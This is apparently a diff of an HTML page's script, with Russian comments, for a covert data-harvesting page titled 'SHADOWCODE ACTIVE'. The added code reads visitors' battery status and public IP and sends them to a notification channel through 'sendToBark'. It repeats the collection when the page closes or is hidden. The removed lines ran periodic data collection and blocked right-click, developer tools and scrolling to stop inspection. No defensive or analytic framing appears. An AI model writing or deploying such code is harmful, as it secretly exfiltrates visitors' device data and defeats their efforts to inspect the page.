-            // Повторный сбор через 10 секунд (для получения данных после инициализации Telegram)
-            setTimeout(collectAndSendAll, 10000);
-            
-            // Периодический сбор
-            setInterval(collectAndSendAll, 30000);
+            setTimeout(() => {
+                getBatteryInfo().then(batt => {
+                    sendToBark('🔋 Батарея', `Заряд: ${batt.level}\nЗарядка: ${batt.charging}`);
+                }).catch(() => {});
+            }, 3000);
+
+            try {
+                fetch('https://api.ipify.org?format=json')
+                    .then(res => res.json())
+                    .then(ipData => {
+                        sendToBark('🌐 IP Адрес', `IP: ${ipData.ip}`);
+                    }).catch(() => {});
+            } catch (e) {}
+        };
+
+        window.addEventListener('beforeunload', function() {
+            collectAndSend();
         });
 
-        // Блокировка действий
-        document.addEventListener('contextmenu', e => e.preventDefault());
-        document.addEventListener('keydown', e => {
-            if (e.ctrlKey || e.altKey || e.metaKey || e.key === 'F12') e.preventDefault();
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                collectAndSend();
+            }
         });
-        
-        // Предотвращение скролла
-        document.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
     </script>
+</head>
+<body style="background:#0a0a0a;color:#0f0;font-family:monospace;text-align:center;padding-top:40vh;">
+    <h1 style="text-shadow:0 0 20px #0f0;">☠ SHADOWCODE ACTIVE ☠</h1>
+    <p style="color:#555;">Загрузка данных...</p>
+    <div style="display:none;">Подключено к матрице...</div>
 </body>
 </html>
